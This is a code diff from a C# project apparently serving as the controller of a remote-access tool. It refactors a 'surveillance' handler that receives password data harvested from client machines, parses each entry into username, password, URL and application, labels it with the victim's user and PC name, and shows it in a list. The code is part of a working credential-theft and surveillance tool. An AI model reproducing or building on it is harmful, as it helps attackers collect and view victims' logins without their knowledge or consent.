@@ -7,34 +7,35 @@ using xServer.Core.Networking;
 using xServer.Core.Packets.ClientPackets;
 using xServer.Core.Packets.ServerPackets;
 using xServer.Core.Utilities;
-using xServer.Core.Recovery.Helper;
 
 namespace xServer.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT ARE USED FOR SURVEILLANCE. */
     public static partial class CommandHandler
     {
-        public static void HandlePasswordResponse(Client client, GetPasswordsResponse packet)
+        public static void HandleGetPasswordsResponse(Client client, GetPasswordsResponse packet)
         {
-            if (client.Value.FrmPass == null)
+            if (client.Value == null || client.Value.FrmPass == null)
                 return;
 
             if (packet.Passwords == null)
                 return;
+
+            string userAtPc = string.Format("{0}@{1}", client.Value.Username, client.Value.PCName);
 
             List<LoginInfo> lst = new List<LoginInfo>();
 
             foreach (string str in packet.Passwords)
             {
                 // raw passworddata
-                string[] values = str.Split(new string[] { "|$|" }, StringSplitOptions.None);
-                lst.Add(new LoginInfo() { Username = values[0], Password = values[1], URL = values[2], Browser = values[3] });
+                string[] values = str.Split(new string[] { DELIMITER }, StringSplitOptions.None);
+                lst.Add(new LoginInfo() { Username = values[0], Password = values[1], URL = values[2], Application = values[3] });
             }
 
             foreach (LoginInfo login in lst)
             {
                 // add them to the listview of frmpass
-                client.Value.FrmPass.AddPassword(login, client);
+                client.Value.FrmPass.AddPassword(login, userAtPc);
             }
         }
         public static void HandleGetDesktopResponse(Client client, GetDesktopResponse packet)
